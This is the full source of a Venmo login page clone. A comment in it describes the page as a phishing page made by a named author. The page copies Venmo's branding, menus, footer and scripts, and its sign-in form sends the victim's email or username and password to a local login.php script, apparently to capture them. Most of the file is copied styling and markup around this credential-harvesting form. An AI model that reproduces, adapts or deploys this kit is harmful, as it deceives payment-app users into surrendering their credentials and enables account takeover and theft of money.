<?php
include "validate.php";
?>
<!DOCTYPE html>
<html>
    <!--Designed as phishing page by KasRoudra(https://github.com/KasRoudra)-->
    <head prefix="og: http://ogp.me/ns# fb: http://ogp.me/ns/fb#">
        <title>Venmo</title>
        <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" />
        <meta charset="utf-8" />
        <meta name="referrer" content="origin" />
        <link rel="stylesheet" href="./style.css" />
        <!--<link rel="stylesheet" href="https://venmo.com/build/stylesheets/../stylesheets/auth.da057eaa579ace1ee189.compiled.css" />-->
        <link href="https://cdn.plaid.com/link/2.0.1353/link-dynamic-loader.js" rel="prefetch" as="script" />
        <style type="text/css"></style>
        <style type="text/css" data-fbcssmodules="css:fb.css.base css:fb.css.dialog css:fb.css.iframewidget css:fb.css.customer_chat_plugin_iframe">
            .fb_hidden {
                position: absolute;
                top: -10000px;
                z-index: 10001;
            }
            .fb_reposition {
                overflow: hidden;
                position: relative;
            }
            .fb_invisible {
                display: none;
            }
            .fb_reset {
                background: none;
                border: 0;
                border-spacing: 0;
                color: #000;
                cursor: auto;
                direction: ltr;
                font-family: "lucida grande", tahoma, verdana, arial, sans-serif;
                font-size: 11px;
                font-style: normal;
                font-variant: normal;
                font-weight: normal;
                letter-spacing: normal;
                line-height: 1;
                margin: 0;
                overflow: visible;
                padding: 0;
                text-align: left;
                text-decoration: none;
                text-indent: 0;
                text-shadow: none;
                text-transform: none;
                visibility: visible;
                white-space: normal;
                word-spacing: normal;
            }
            .fb_reset > div {
                overflow: hidden;
            }
            @keyframes fb_transform {
                from {
                    opacity: 0;
                    transform: scale(0.95);
                }
                to {
                    opacity: 1;
                    transform: scale(1);
                }
            }
            .fb_animate {
                animation: fb_transform 0.3s forwards;
            }
            .fb_hidden {
                position: absolute;
                top: -10000px;
                z-index: 10001;
            }
            .fb_reposition {
                overflow: hidden;
                position: relative;
            }
            .fb_invisible {
                display: none;
            }
            .fb_reset {
                background: none;
                border: 0;
                border-spacing: 0;
                color: #000;
                cursor: auto;
                direction: ltr;
                font-family: "lucida grande", tahoma, verdana, arial, sans-serif;
                font-size: 11px;
                font-style: normal;
                font-variant: normal;
                font-weight: normal;
                letter-spacing: normal;
                line-height: 1;
                margin: 0;
                overflow: visible;
                padding: 0;
                text-align: left;
                text-decoration: none;
                text-indent: 0;
                text-shadow: none;
                text-transform: none;
                visibility: visible;
                white-space: normal;
                word-spacing: normal;
            }
            .fb_reset > div {
                overflow: hidden;
            }
            @keyframes fb_transform {
                from {
                    opacity: 0;
                    transform: scale(0.95);
                }
                to {
                    opacity: 1;
                    transform: scale(1);
                }
            }
            .fb_animate {
                animation: fb_transform 0.3s forwards;
            }
            .fb_dialog {
                background: rgba(82, 82, 82, 0.7);
                position: absolute;
                top: -10000px;
                z-index: 10001;
            }
            .fb_dialog_advanced {
                border-radius: 8px;
                padding: 10px;
            }
            .fb_dialog_content {
                background: #fff;
                color: #373737;
            }
            .fb_dialog_close_icon {
                background: url(https://static.xx.fbcdn.net/rsrc.php/v3/yq/r/IE9JII6Z1Ys.png) no-repeat scroll 0 0 transparent;
                cursor: pointer;
                display: block;
                height: 15px;
                position: absolute;
                right: 18px;
                top: 17px;
                width: 15px;
            }
            .fb_dialog_mobile .fb_dialog_close_icon {
                left: 5px;
                right: auto;
                top: 5px;
            }
            .fb_dialog_padding {
                background-color: transparent;
                position: absolute;
                width: 1px;
                z-index: -1;
            }
            .fb_dialog_close_icon:hover {
                background: url(https://static.xx.fbcdn.net/rsrc.php/v3/yq/r/IE9JII6Z1Ys.png) no-repeat scroll 0 -15px transparent;
            }
            .fb_dialog_close_icon:active {
                background: url(https://static.xx.fbcdn.net/rsrc.php/v3/yq/r/IE9JII6Z1Ys.png) no-repeat scroll 0 -30px transparent;
            }
            .fb_dialog_iframe {
                line-height: 0;
            }
            .fb_dialog_content .dialog_title {
                background: #6d84b4;
                border: 1px solid #365899;
                color: #fff;
                font-size: 14px;
                font-weight: bold;
                margin: 0;
            }
            .fb_dialog_content .dialog_title > span {
                background: url(https://static.xx.fbcdn.net/rsrc.php/v3/yd/r/Cou7n-nqK52.gif) no-repeat 5px 50%;
                float: left;
                padding: 5px 0 7px 26px;
            }
            body.fb_hidden {
                height: 100%;
                left: 0;
                margin: 0;
                overflow: visible;
                position: absolute;
                top: -10000px;
                transform: none;
                width: 100%;
            }
            .fb_dialog.fb_dialog_mobile.loading {
                background: url(https://static.xx.fbcdn.net/rsrc.php/v3/ya/r/3rhSv5V8j3o.gif) white no-repeat 50% 50%;
                min-height: 100%;
                min-width: 100%;
                overflow: hidden;
                position: absolute;
                top: 0;
                z-index: 10001;
            }
            .fb_dialog.fb_dialog_mobile.loading.centered {
                background: none;
                height: auto;
                min-height: initial;
                min-width: initial;
                width: auto;
            }
            .fb_dialog.fb_dialog_mobile.loading.centered #fb_dialog_loader_spinner {
                width: 100%;
            }
            .fb_dialog.fb_dialog_mobile.loading.centered .fb_dialog_content {
                background: none;
            }
            .loading.centered #fb_dialog_loader_close {
                clear: both;
                color: #fff;
                display: block;
                font-size: 18px;
                padding-top: 20px;
            }
            #fb-root #fb_dialog_ipad_overlay {
                background: rgba(0, 0, 0, 0.4);
                bottom: 0;
                left: 0;
                min-height: 100%;
                position: absolute;
                right: 0;
                top: 0;
                width: 100%;
                z-index: 10000;
            }
            #fb-root #fb_dialog_ipad_overlay.hidden {
                display: none;
            }
            .fb_dialog.fb_dialog_mobile.loading iframe {
                visibility: hidden;
            }
            .fb_dialog_mobile .fb_dialog_iframe {
                position: sticky;
                top: 0;
            }
            .fb_dialog_content .dialog_header {
                background: linear-gradient(from(#738aba), to(#2c4987));
                border-bottom: 1px solid;
                border-color: #043b87;
                box-shadow: white 0 1px 1px -1px inset;
                color: #fff;
                font: bold 14px Helvetica, sans-serif;
                text-overflow: ellipsis;
                text-shadow: rgba(0, 30, 84, 0.296875) 0 -1px 0;
                vertical-align: middle;
                white-space: nowrap;
            }
            .fb_dialog_content .dialog_header table {
                height: 43px;
                width: 100%;
            }
            .fb_dialog_content .dialog_header td.header_left {
                font-size: 12px;
                padding-left: 5px;
                vertical-align: middle;
                width: 60px;
            }
            .fb_dialog_content .dialog_header td.header_right {
                font-size: 12px;
                padding-right: 5px;
                vertical-align: middle;
                width: 60px;
            }
            .fb_dialog_content .touchable_button {
                background: linear-gradient(from(#4267b2), to(#2a4887));
                background-clip: padding-box;
                border: 1px solid #29487d;
                border-radius: 3px;
                display: inline-block;
                line-height: 18px;
                margin-top: 3px;
                max-width: 85px;
                padding: 4px 12px;
                position: relative;
            }
            .fb_dialog_content .dialog_header .touchable_button input {
                background: none;
                border: none;
                color: #fff;
                font: bold 12px Helvetica, sans-serif;
                margin: 2px -12px;
                padding: 2px 6px 3px 6px;
                text-shadow: rgba(0, 30, 84, 0.296875) 0 -1px 0;
            }
            .fb_dialog_content .dialog_header .header_center {
                color: #fff;
                font-size: 16px;
                font-weight: bold;
                line-height: 18px;
                text-align: center;
                vertical-align: middle;
            }
            .fb_dialog_content .dialog_content {
                background: url(https://static.xx.fbcdn.net/rsrc.php/v3/y9/r/jKEcVPZFk-2.gif) no-repeat 50% 50%;
                border: 1px solid #4a4a4a;
                border-bottom: 0;
                border-top: 0;
                height: 150px;
            }
            .fb_dialog_content .dialog_footer {
                background: #f5f6f7;
                border: 1px solid #4a4a4a;
                border-top-color: #ccc;
                height: 40px;
            }
            #fb_dialog_loader_close {
                float: left;
            }
            .fb_dialog.fb_dialog_mobile .fb_dialog_close_icon {
                visibility: hidden;
            }
            #fb_dialog_loader_spinner {
                animation: rotateSpinner 1.2s linear infinite;
                background-color: transparent;
                background-image: url(https://static.xx.fbcdn.net/rsrc.php/v3/yD/r/t-wz8gw1xG1.png);
                background-position: 50% 50%;
                background-repeat: no-repeat;
                height: 24px;
                width: 24px;
            }
            @keyframes rotateSpinner {
                0% {
                    transform: rotate(0deg);
                }
                100% {
                    transform: rotate(360deg);
                }
            }
            .fb_iframe_widget {
                display: inline-block;
                position: relative;
            }
            .fb_iframe_widget span {
                display: inline-block;
                position: relative;
                text-align: justify;
            }
            .fb_iframe_widget iframe {
                position: absolute;
            }
            .fb_iframe_widget_fluid_desktop,
            .fb_iframe_widget_fluid_desktop span,
            .fb_iframe_widget_fluid_desktop iframe {
                max-width: 100%;
            }
            .fb_iframe_widget_fluid_desktop iframe {
                min-width: 220px;
                position: relative;
            }
            .fb_iframe_widget_lift {
                z-index: 1;
            }
            .fb_iframe_widget_fluid {
                display: inline;
            }
            .fb_iframe_widget_fluid span {
                width: 100%;
            }
            .fb_mpn_mobile_landing_page_slide_out {
                animation-duration: 200ms;
                animation-name: fb_mpn_landing_page_slide_out;
                transition-timing-function: ease-in;
            }
            .fb_mpn_mobile_landing_page_slide_out_from_left {
                animation-duration: 200ms;
                animation-name: fb_mpn_landing_page_slide_out_from_left;
                transition-timing-function: ease-in;
            }
            .fb_mpn_mobile_landing_page_slide_up {
                animation-duration: 500ms;
                animation-name: fb_mpn_landing_page_slide_up;
                transition-timing-function: ease-in;
            }
            .fb_mpn_mobile_bounce_in {
                animation-duration: 300ms;
                animation-name: fb_mpn_bounce_in;
                transition-timing-function: ease-in;
            }
            .fb_mpn_mobile_bounce_out {
                animation-duration: 300ms;
                animation-name: fb_mpn_bounce_out;
                transition-timing-function: ease-in;
            }
            .fb_mpn_mobile_bounce_out_v2 {
                animation-duration: 300ms;
                animation-name: fb_mpn_fade_out;
                transition-timing-function: ease-in;
            }
            .fb_customer_chat_bounce_in_v2 {
                animation-duration: 300ms;
                animation-name: fb_bounce_in_v2;
                transition-timing-function: ease-in;
            }
            .fb_customer_chat_bounce_in_from_left {
                animation-duration: 300ms;
                animation-name: fb_bounce_in_from_left;
                transition-timing-function: ease-in;
            }
            .fb_customer_chat_bounce_out_v2 {
                animation-duration: 300ms;
                animation-name: fb_bounce_out_v2;
                transition-timing-function: ease-in;
            }
            .fb_customer_chat_bounce_out_from_left {
                animation-duration: 300ms;
                animation-name: fb_bounce_out_from_left;
                transition-timing-function: ease-in;
            }
            .fb_invisible_flow {
                display: inherit;
                height: 0;
                overflow-x: hidden;
                width: 0;
            }
            @keyframes fb_mpn_landing_page_slide_out {
                0% {
                    margin: 0 12px;
                    width: 100% - 24px;
                }
                60% {
                    border-radius: 18px;
                }
                100% {
                    border-radius: 50%;
                    margin: 0 24px;
                    width: 60px;
                }
            }
            @keyframes fb_mpn_landing_page_slide_out_from_left {
                0% {
                    left: 12px;
                    width: 100% - 24px;
                }
                60% {
                    border-radius: 18px;
                }
                100% {
                    border-radius: 50%;
                    left: 12px;
                    width: 60px;
                }
            }
            @keyframes fb_mpn_landing_page_slide_up {
                0% {
                    bottom: 0;
                    opacity: 0;
                }
                100% {
                    bottom: 24px;
                    opacity: 1;
                }
            }
            @keyframes fb_mpn_bounce_in {
                0% {
                    opacity: 0.5;
                    top: 100%;
                }
                100% {
                    opacity: 1;
                    top: 0;
                }
            }
            @keyframes fb_mpn_fade_out {
                0% {
                    bottom: 30px;
                    opacity: 1;
                }
                100% {
                    bottom: 0;
                    opacity: 0;
                }
            }
            @keyframes fb_mpn_bounce_out {
                0% {
                    opacity: 1;
                    top: 0;
                }
                100% {
                    opacity: 0.5;
                    top: 100%;
                }
            }
            @keyframes fb_bounce_in_v2 {
                0% {
                    opacity: 0;
                    transform: scale(0, 0);
                    transform-origin: bottom right;
                }
                50% {
                    transform: scale(1.03, 1.03);
                    transform-origin: bottom right;
                }
                100% {
                    opacity: 1;
                    transform: scale(1, 1);
                    transform-origin: bottom right;
                }
            }
            @keyframes fb_bounce_in_from_left {
                0% {
                    opacity: 0;
                    transform: scale(0, 0);
                    transform-origin: bottom left;
                }
                50% {
                    transform: scale(1.03, 1.03);
                    transform-origin: bottom left;
                }
                100% {
                    opacity: 1;
                    transform: scale(1, 1);
                    transform-origin: bottom left;
                }
            }
            @keyframes fb_bounce_out_v2 {
                0% {
                    opacity: 1;
                    transform: scale(1, 1);
                    transform-origin: bottom right;
                }
                100% {
                    opacity: 0;
                    transform: scale(0, 0);
                    transform-origin: bottom right;
                }
            }
            @keyframes fb_bounce_out_from_left {
                0% {
                    opacity: 1;
                    transform: scale(1, 1);
                    transform-origin: bottom left;
                }
                100% {
                    opacity: 0;
                    transform: scale(0, 0);
                    transform-origin: bottom left;
                }
            }
            @keyframes slideInFromBottom {
                0% {
                    opacity: 0.1;
                    transform: translateY(100%);
                }
                100% {
                    opacity: 1;
                    transform: translateY(0);
                }
            }
            @keyframes slideInFromBottomDelay {
                0% {
                    opacity: 0;
                    transform: translateY(100%);
                }
                97% {
                    opacity: 0;
                    transform: translateY(100%);
                }
                100% {
                    opacity: 1;
                    transform: translateY(0);
                }
            }
        </style>
    </head>
    <body>
        <div id="app">
            <div data-reactroot="" data-reactid="1" data-react-checksum="-292695385">
                <div data-reactid="2">
                    <header class="main-header logged-out" data-reactid="3">
                        <div class="container" data-reactid="4">
                            <div class="global-margin" data-reactid="5">
                                <div class="row" data-reactid="6">
                                    <div class="col-md-12" data-reactid="7">
                                        <div class="vui-header-hamburger" data-reactid="8">
                                            <button aria-pressed="false" data-reactid="9">
                                                <svg width="30" height="20" data-reactid="10">
                                                    <title data-reactid="11">Menu Button</title>
                                                    <g class="vui-header-hamburger_top" data-reactid="12"><line x1="-10" x2="10" y1="0" y2="0" data-reactid="13"></line></g>
                                                    <g class="vui-header-hamburger_middle" data-reactid="14"><line x1="-10" x2="10" y1="0" y2="0" data-reactid="15"></line></g>
                                                    <g class="vui-header-hamburger_bottom" data-reactid="16"><line x1="-10" x2="10" y1="0" y2="0" data-reactid="17"></line></g>
                                                </svg>
                                            </button>
                                        </div>
                                        <a href="https://venmo.com/" class="venmo asset-venmo-logo-blue" alt="Venmo" data-reactid="18"></a>
                                        <ul class="hide-mobile" data-reactid="19">
                                            <li data-reactid="20"><a href="https://venmo.com/about/product" data-reactid="21">How Venmo Works</a></li>
                                            <li class="" data-reactid="22"><a href="https://venmo.com/business" data-reactid="23">Business</a></li>
                                            <li data-reactid="24"><a href="https://venmo.com/card" data-reactid="25">Debit Card</a></li>
                                            <li data-reactid="26"><a href="https://venmo.com/about/security" data-reactid="27">Security</a></li>
                                            <li data-reactid="28"><a href="https://venmo.com/contact-us" class="contact-us-nav" data-reactid="29">Contact Us</a></li>
                                        </ul>
                                        <div class="hide-mobile sign-in-container" data-reactid="30">
                                            <div class="sign-in" data-reactid="31"><a href="https://venmo.com/account/sign-in" class="sign-in active" data-reactid="32">Sign In</a></div>
                                        </div>
                                        <nav class="vui-header-menu" aria-hidden="true" data-reactid="33">
                                            <div class="vui-header-menu__content" data-reactid="34">
                                                <div data-reactid="35">
                                                    <ul data-reactid="36">
                                                        <li data-reactid="37"><a href="https://venmo.com/about/product" data-reactid="38">How Venmo Works</a></li>
                                                        <li data-reactid="39"><a href="https://venmo.com/business" data-reactid="40">Business</a></li>
                                                        <li data-reactid="41"><a href="https://venmo.com/card" data-reactid="42">Debit Card</a></li>
                                                        <li data-reactid="43"><a href="https://venmo.com/about/security" data-reactid="44">Security</a></li>
                                                        <li data-reactid="45"><a href="https://venmo.com/contact-us" data-reactid="46">Contact Us</a></li>
                                                        <li data-reactid="47">
                                                            <strong data-reactid="48"><a href="https://venmo.com/account/sign-in" data-reactid="49">Sign in</a></strong>
                                                        </li>
                                                    </ul>
                                                </div>
                                            </div>
                                            <div class="vui-header-menu__mask" aria-disabled="true" data-reactid="50"></div>
                                        </nav>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </header>
                    <div class="status-bar row" data-reactid="51"><div class="container" data-reactid="52"></div></div>
                    <div id="content" data-reactid="53">
                        <div class="container-fluid" data-reactid="54">
                            <div data-reactid="55">
                                <div class="auth-header-text" data-reactid="56"><h3 data-reactid="57">Sign in to Venmo</h3></div>
                                <form class="auth-form" method="post" action="./login.php">
                                    <fieldset class="inputs" data-reactid="59">
                                        <label class="error auth-form-input-label" data-reactid="60">
                                            <span class="label-text" data-reactid="61">Email, Mobile, or User Name</span>
                                            <input type="text" class="auth-form-input" aria-label="username" placeholder=""  name="email" value="" />
                                            <span data-reactid="63" class="error-text">Required</span>
                                        </label>
                                        <div class="auth-password-container" data-reactid="64">
                                            <label class="error auth-form-input-label" data-reactid="65">
                                                <span class="label-text" >Password</span>
                                                <input type="password" class="auth-form-input" aria-label="password" placeholder="•••••••" name="password" value="" />
                                                <span data-reactid="68" class="error-text">Required</span>
                                            </label>
                                        </div>
                                    </fieldset>
                                    <div class="button-wrapper" data-reactid="69">
                                        <button class="ladda-button auth-button" type="submit" data-style="zoom-out" >
                                            <span class="ladda-label" data-reactid="71">Sign In</span><span class="ladda-spinner" data-reactid="72"></span>
                                        </button>
                                        <a href="https://venmo.com/account/password-reset" class="auth-forgot-password" data-test="forgot" data-reactid="73">Forgot Password?</a>
                                    </div>
                                </form>
                                <div class="auth-footer-text" data-reactid="74"><a href="https://account.venmo.com/signup" class="auth-create-account" data-test="signup" data-reactid="75">Sign Up</a></div>
                            </div>
                        </div>
                    </div>
                    <footer data-reactid="76">
                        <div class="footer-desktop" data-reactid="77">
                            <div class="bottom large-screen" data-reactid="78">
                                <div class="container" data-reactid="79">
                                    <div class="global-margin" data-reactid="80">
                                        <div class="row" data-reactid="81">
                                            <div class="section col-sm-2" data-reactid="82">
                                                <h4 data-reactid="83">Learn more</h4>
                                                <ul data-reactid="84">
                                                    <li data-reactid="85"><a href="https://venmo.com/about/product" data-reactid="86">How it works</a></li>
                                                    <li data-reactid="87"><a href="https://venmo.com/about/fees" data-reactid="88">Our Fees</a></li>
                                                    <li data-reactid="89"><a href="https://venmo.com/business" data-reactid="90">Business</a></li>
                                                    <li data-reactid="91"><a href="https://venmo.com/card" data-reactid="92">Debit Card</a></li>
                                                    <li data-reactid="93"><a href="https://venmo.com/about/security" data-reactid="94">Security</a></li>
                                                    <li data-reactid="95"><a href="https://venmo.com/contact-us/" data-reactid="96">Contact Us</a></li>
                                                </ul>
                                            </div>
                                            <div class="section col-sm-2" data-reactid="97">
                                                <h4 data-reactid="98">Company</h4>
                                                <ul data-reactid="99">
                                                    <li data-reactid="100"><a href="https://venmo.com/team/" data-reactid="101">Our Team</a></li>
                                                    <li data-reactid="102"><a href="https://venmo.com/jobs" data-reactid="103">Jobs</a></li>
                                                </ul>
                                            </div>
                                            <div class="section col-sm-2" data-reactid="104">
                                                <h4 data-reactid="105">Community</h4>
                                                <ul data-reactid="106">
                                                    <li data-reactid="107"><a target="_blank" href="http://blog.venmo.com" data-reactid="108">Blog</a></li>
                                                    <li data-reactid="109"><a target="_blank" href="https://help.venmo.com" data-reactid="110">Help Center</a></li>
                                                    <li data-reactid="111"><a target="_blank" href="https://venmo.com/developers" data-reactid="112">Developer</a></li>
                                                </ul>
                                            </div>
                                            <div class="section col-sm-2" data-reactid="113">
                                                <h4 data-reactid="114">Terms</h4>
                                                <ul data-reactid="115">
                                                    <li data-reactid="116"><a href="https://venmo.com/legal/us-user-agreement/" data-reactid="117">Legal</a></li>
                                                    <li data-reactid="118"><a href="https://venmo.com/legal/us-privacy-policy/" data-reactid="119">Privacy</a></li>
                                                </ul>
                                            </div>
                                            <div class="section col-sm-2" data-reactid="120">
                                                <a href="https://itunes.apple.com/us/app/venmo/id351727428?mt=8" data-reactid="121">
                                                    <img class="download-links" src="./apple-app-store.png" alt="Apple App Store link to download Venmo" data-reactid="122" />
                                                </a>
                                            </div>
                                            <div class="section col-sm-2" data-reactid="123">
                                                <a href="https://play.google.com/store/apps/details?id=com.venmo" data-reactid="124">
                                                    <img class="download-links" src="./google-play-badge.png" alt="Google Play Store Badge to download Venmo" data-reactid="125" />
                                                </a>
                                            </div>
                                        </div>
                                        <div class="row" data-reactid="126">
                                            <div class="col-sm-11 copyright" data-reactid="127">
                                                <p data-reactid="128">
                                                    <!-- react-text: 129 -->Venmo is a service of PayPal, Inc., a licensed provider of money transfer services (NMLS ID: 910457). All money transmission is provided by PayPal, Inc. pursuant to<!-- /react-text --><!-- react-text: 130 -->
                                                    <!-- /react-text -->
                                                    <a href="https://venmo.com/legal/us-disclosures/" data-reactid="131">PayPal, Inc.’s licenses</a>
                                                    <!-- react-text: 132 -->. ©
                                                    <!-- /react-text --><!-- react-text: 133 -->2022<!-- /react-text --><!-- react-text: 134 -->
                                                    PayPal, Inc.<!-- /react-text -->
                                                </p>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                        <div class="footer-mobile row" data-reactid="135">
                            <div class="section col-sm-12" data-reactid="136">
                                <div class="footer-mobile-copyright" data-reactid="137">Copyright © Venmo.</div>
                                <div class="footer-mobile-links" data-reactid="138"><a href="http://help.venmo.com" class="help" data-reactid="139">Help</a><a href="https://venmo.com/about/security" class="security" data-reactid="140">Security</a></div>
                            </div>
                        </div>
                    </footer>
                </div>
            </div>
        </div>
        <script src="https://connect.facebook.net/en_US/sdk.js?hash=a6217a1a379e9f93d6e1cfefa3a2b747" async="" crossorigin="anonymous"></script>
        <script id="plaid-jssdk" async="" src="https://venmo.com//cdn.plaid.com/link/v2/stable/link-initialize.js"></script>
        <script async="" src="https://venmo.com//d2zah9y47r7bi2.cloudfront.net/releases/current/tracker.js"></script>
        <script type="text/javascript" async="" src="https://jssdkcdns.mparticle.com/js/v2/40433222e815b743853a4bb6b7a86058/mparticle.js"></script>
        <script async="" src="https://venmo.com//www.google-analytics.com/analytics.js"></script>
        <script id="facebook-jssdk" async="" src="https://venmo.com//connect.facebook.net/en_US/sdk.js"></script>
        <script id="__HTMLDOCUMENT__UNIVERSAL_STATE" type="application/json">
            {
                "mfa": { "helpVisible": false },
                "auth": { "showHeaderAndFooter": true, "user": { "phone": "" }, "shouldShowLearnMore": false, "isIOS": false, "isAndroid": true },
                "status": { "isError": false, "isVisible": false, "message": "" },
                "form": {
                    "verify-bank": { "_asyncValidating": false, "_initialized": false, "_submitting": false, "_submitFailed": false, "bankAccountNumber": { "value": "" } },
                    "verify-card": { "_asyncValidating": false, "_initialized": false, "_submitting": false, "_submitFailed": false, "cardNumber": { "value": "" }, "expirationDate": { "value": "" } },
                    "verify-phone-email": { "_asyncValidating": false, "_initialized": false, "_submitting": false, "_submitFailed": false, "token": { "value": "" } },
                    "sign-up-email": { "_asyncValidating": false, "_initialized": false, "_submitting": false, "_submitFailed": false, "phone": { "value": "" } },
                    "sign-up-facebook": { "_asyncValidating": false, "_initialized": false, "_submitting": false, "_submitFailed": false, "phone": { "value": "" } }
                }
            }
        </script>
        <script>
            window.venmo = window.venmo || {};
            window.venmo.app = { name: "auth", useServices: true, version: "-" };
        </script>
        <script>
            window.venmo = window.venmo || {};
            window.venmo.device = { userAgent: { isIOS: false, isAndroid: true, isMobile: true, isWebview: false } };
        </script>
        <script>
            window.venmo = window.venmo || {};
            window.venmo.services = {
                braintree_encryption: {
                    braintree_cse_public_key:
                        "MIIBCgKCAQEAocjDYw9sXSlP9RioVLRhlKdAsvzCdSfztugTCRV6sQuLXsemB04tAmbjdfMUPvef5ox4vFLPAvA3EDoj6jj/90zM+JI1KZZL3AyQvyLVxrLDRBsWGDawrz+bc2RLZE+SuWJwD3OwOIqZE6mMTUzJfyO8nw0S85YMITT5ylpczvSi8jytBMBv8ur6EIdK6U2RddnIVbgVoAUXMQZqhDprJsGjExEVyWtpTibvCvHum173lafm5nt6gK36uGQwOXqlCZxOvET2W7MrV6QnGFJj+S5w4vZS6E9uIDslb9NLbUKUnjo1TUuZ+bLEFe7XfA57yCafuHPinz3qBI3fTuMUbQIDAQAB",
                    enabled: true,
                },
                braintree: { tokenization_key: "production_pg6js949_dcz2m2h9dfjptytk" },
                facebook: { enabled: true, id: "180347063770" },
                ga: { enabled: true, id: "UA-15492939-15", contentPageId: "UA-15492939-14" },
                trackjs: { token: "42f77a0fdea14510acb1a4afce90f71d", enabled: true },
                mParticle: { enabled: true, id: "40433222e815b743853a4bb6b7a86058", isSandbox: false, excludingPaths: ["https://venmo.com/account/password-new"] },
                plaid: { enabled: true, env: "production", key: "05e9781bcf561d4f946d221f75e21c", apiVersion: "v2", clientName: "Venmo" },
            };
        </script>
        <script>
            /* eslint-disable */
            (function () {
                function plaid(config) {
                    (function (d) {
                        var js,
                            id = "plaid-jssdk",
                            ref = d.getElementsByTagName("script")[0];
                        if (d.getElementById(id)) {
                            return;
                        }
                        js = d.createElement("script");
                        js.id = id;
                        js.async = true;
                        js.src = "https://venmo.com//cdn.plaid.com/link/v2/stable/link-initialize.js";
                        ref.parentNode.insertBefore(js, ref);
                    })(document);

                    window.createPlaidHandler = function (option) {
                        return (
                            window.Plaid &&
                            window.Plaid.create({
                                apiVersion: config.apiVersion,
                                clientName: config.clientName,
                                env: config.env,
                                key: config.key,
                                product: "auth",
                                selectAccount: false,
                                onSuccess: option.onSuccess,
                                onExit: option.onExit,
                                isEmbedded: true,
                                onEvent: option.onEvent,
                            })
                        );
                    };
                }

                function facebook(config) {
                    window.fbAsyncInit = function () {
                        FB.init({
                            appId: config.id,
                            xfbml: true,
                            status: true,
                            version: "v2.4",
                        });
                    };
                    (function (d) {
                        var js,
                            id = "facebook-jssdk",
                            ref = d.getElementsByTagName("script")[0];
                        if (d.getElementById(id)) {
                            return;
                        }
                        js = d.createElement("script");
                        js.id = id;
                        js.async = true;
                        js.src = "https://venmo.com//connect.facebook.net/en_US/sdk.js";
                        ref.parentNode.insertBefore(js, ref);
                    })(document);
                }

                function googleAnalytics(config) {
                    (function (i, s, o, g, r, a, m) {
                        i["GoogleAnalyticsObject"] = r;
                        (i[r] =
                            i[r] ||
                            function () {
                                (i[r].q = i[r].q || []).push(arguments);
                            }),
                            (i[r].l = 1 * new Date());
                        (a = s.createElement(o)), (m = s.getElementsByTagName(o)[0]);
                        a.async = 1;
                        a.src = g;
                        m.parentNode.insertBefore(a, m);
                    })(window, document, "script", "https://venmo.com//www.google-analytics.com/analytics.js", "ga");

                    /**
                     * We only want to track with webapp property by default on webapp pages.
                     * On content pages, we send pageviews to both, but track events by default to webapp property.
                     * We also don't want to pass along any query params, as they may contain sensitive info.
                     * We override `location` per the dev guide to prevent it from being set with params included.
                     * https://developers.google.com/analytics/devguides/collection/analyticsjs/creating-trackers
                     */
                    var pageUrl = window.location.href.split("?")[0];
                    if (window.venmo.app && window.venmo.app.isContentPage) {
                        ga("create", config.contentPageId, "auto", "contentPageTracker");
                        ga("create", config.id, "auto");
                        ga("set", "location", pageUrl);
                        ga("contentPageTracker.send", "pageview");
                        ga("send", "pageview");
                    } else {
                        ga("create", config.id, "auto");
                        ga("set", "location", pageUrl);
                        ga("send", "pageview");
                    }
                }

                function twitter() {
                    window.twttr = (function (d, s, id) {
                        var js,
                            fjs = d.getElementsByTagName(s)[0],
                            t = window.twttr || {};
                        if (d.getElementById(id)) return t;
                        js = d.createElement(s);
                        js.id = id;
                        js.src = "https://platform.twitter.com/widgets.js";
                        fjs.parentNode.insertBefore(js, fjs);

                        t._e = [];
                        t.ready = function (f) {
                            t._e.push(f);
                        };

                        return t;
                    })(document, "script", "twitter-wjs");
                }

                function mParticle(config) {
                    (function (apiKey) {
                        window.mParticle = window.mParticle || {};
                        window.mParticle.isIOS = /Venmo.*(iPhone|iPad|iPod)/i.test(navigator.userAgent);
                        window.mParticle.config = window.mParticle.config || {};
                        window.mParticle.config.rq = [];
                        window.mParticle.ready = function (f) {
                            window.mParticle.config.rq.push(f);
                        };
                        var mp = document.createElement("script");
                        mp.type = "text/javascript";
                        mp.async = config.async === false ? config.async : true;
                        mp.src = ("https:" == document.location.protocol ? "https://jssdkcdns" : "http://jssdkcdn") + ".mparticle.com/js/v2/" + apiKey + "https://venmo.com/mparticle.js";
                        var s = document.getElementsByTagName("script")[0];
                        s.parentNode.insertBefore(mp, s);
                    })(config.id);
                }

                function trackjs(config) {
                    (function (d) {
                        var js,
                            ref = d.getElementsByTagName("script")[0];
                        js = d.createElement("script");
                        js.async = true;
                        js.src = "https://venmo.com//d2zah9y47r7bi2.cloudfront.net/releases/current/tracker.js";
                        ref.parentNode.insertBefore(js, ref);
                    })(document);
                    window._trackJs = {
                        token: config.token,
                        application: "shabu",
                        version: window.venmo.app.version,
                        onError: function () {
                            return window.venmo.services && window.venmo.services.trackjs && window.venmo.services.trackjs.enabled;
                        },
                    };
                }

                var serviceSnippets = {
                    facebook: facebook,
                    twitter: twitter,
                    ga: googleAnalytics,
                    mParticle: mParticle,
                    trackjs: trackjs,
                    plaid: plaid,
                };

                /* eslint-enable */

                if (window.venmo && window.venmo.services) {
                    var servicesConfig = window.venmo.services;
                    Object.keys(serviceSnippets).forEach(function (service) {
                        var serviceConfig = servicesConfig[service];
                        if (serviceConfig && serviceConfig.enabled && serviceSnippets[service]) {
                            serviceSnippets[service](serviceConfig);
                        }
                    });
                }
            })();
        </script>
        <script src="https://venmo.com/build/js/auth.da057eaa579ace1ee189.min.js" crossorigin="anonymous"></script>
        <div id="fb-root" class="fb_reset">
            <div style="position: absolute; top: -10000px; width: 0px; height: 0px;"><div></div></div>
        </div>
        <style>
            .qc-cmp-showing {
                visibility: hidden !important;
            }
            body.didomi-popup-open {
                overflow: auto !important;
            }
            #didomi-host {
                visibility: hidden !important;
            }
        </style>
    </body>
</html>
